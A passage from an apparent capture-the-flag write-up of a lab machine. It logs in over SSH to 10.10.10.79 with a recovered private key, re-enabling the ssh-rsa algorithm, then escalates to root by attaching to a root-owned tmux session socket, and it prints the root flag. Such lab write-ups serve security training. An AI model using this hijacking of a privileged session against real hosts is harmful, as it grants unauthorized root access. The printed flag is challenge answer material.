## SSH Fail: no mutual signature supported
we also note that OpenSSH to deprecate SHA-1 logins due to security risk. That means we use ssh will failed.

https://www.zdnet.com/article/openssh-to-deprecate-sha-1-logins-due-to-security-risk/

https://ttys3.dev/post/openssh-8-8-p1-no-matching-host-key-type-found-their-offer-ssh-rsa/

```bash
# let's try bypass SHA-1 restriction
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  -i hype_key_decrypted.key hype@10.10.10.79
```

## Tmux

Tmux https://github.com/tmux/tmux/wiki is a terminal multiplexer. It lets you switch easily between several programs in one terminal, detach them (they keep running in the background) and reattach them to a different terminal.

Let's run this command to switch to another terminal.

```bash
/usr/bin/tmux -S /.devs/dev_sess
```

![[Valentine-17.png]]

Excellent! we have a new terminal. And after checking, it is a root privilege terminal.

```bash
whoami
id
# root flag
f1bb6d759df1f272914ebbc9ed7765b2
```
